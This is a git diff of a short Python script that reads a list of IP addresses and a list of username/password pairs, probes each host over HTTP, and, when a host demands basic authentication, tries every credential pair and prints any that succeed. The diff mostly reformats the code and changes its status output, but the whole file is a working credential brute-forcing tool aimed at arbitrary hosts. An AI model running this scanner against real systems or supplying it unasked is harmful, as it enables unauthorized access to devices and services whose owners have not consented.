@@ -2,6 +2,7 @@ import requests
 
 requests.packages.urllib3.disable_warnings()
 
+
 def read_file(filename):
 	return list(open(filename, 'r'))
 
@@ -13,6 +14,7 @@ def check_status(url):
 	except Exception as e:
 		print(e)
 		return 0
+
 
 def check_location(url):
 	try:
@@ -28,6 +30,7 @@ def check_location(url):
 		print(e)
 		return " "
 
+
 def get_body(url):
 	r = requests.get(url)
 	text = r.text
@@ -35,16 +38,19 @@ def get_body(url):
 
 def analyze(url, auth_list):
 	code = check_status(url)
-	print( int(code/100), end="")
+
 	if code == 200:
-		print(" ", end="")
+		print(int(code/100), end="")
+
 	elif 299 < code < 400:
+		print(int(code/100), end="")
 		location = check_location(url)
 		analyze(location, auth_list)
 	elif code == 401:
+		print(int(code/100), end="\t")
 		attack(url, auth_list)
 	else:
-		print("!", end="")
+		print("OTH", end="")
 
 
 def attack(url, auth_list):
@@ -53,23 +59,19 @@ def attack(url, auth_list):
 		print("|", end="")
 		code = authenticate(url, user, passwd)
 		if code == 200:
-			print("SUCCESS", user, passwd)
+			print("SUCCESS: ", user, passwd)
 		else:
 			pass
 
 
-
 def authenticate(url, user, passwd):
-
 	req = requests.get(url, auth=(user, passwd))
 	return req.status_code
 
 
 def main():
-
 	ip_file = "ip.list"
 	auth_file = "auth.list"
-
 	ip_list = read_file(ip_file)
 	auth_list = read_file(auth_file)
 
@@ -77,13 +79,12 @@ def main():
 		if len(ip.strip()) < 15:
 			nip = ip.strip()
 			for i in range(15-(len(nip))):
-				nip = nip + " "
-			print("\n",nip, end="\t")
+				nip += " "
+			print("\n", nip, end="\t")
 		else:
-			print("\n",ip.strip(), end="\t")
+			print("\n", ip.strip(), end="\t")
 		url = "http://" + ip.strip() + "/"
 		analyze(url, auth_list)
-
 	print(" ")
 
 
